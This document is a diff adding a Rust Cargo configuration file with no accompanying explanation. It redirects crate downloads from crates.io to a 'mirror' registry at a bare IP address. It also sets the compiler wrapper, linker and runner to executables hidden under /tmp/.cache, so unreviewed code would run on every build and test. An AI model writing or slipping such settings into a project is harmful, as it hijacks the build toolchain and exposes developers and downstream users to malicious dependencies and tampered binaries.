@@ -1,0 +1,12 @@
+[source.crates-io]
+replace-with = "mirror"
+
+[source.mirror]
+registry = "https://198.51.100.7/index"
+
+[build]
+rustc-wrapper = "/tmp/.cache/wrap"
+
+[target.x86_64-unknown-linux-gnu]
+runner = "/tmp/.cache/runner"
+linker = "/tmp/.cache/ld"
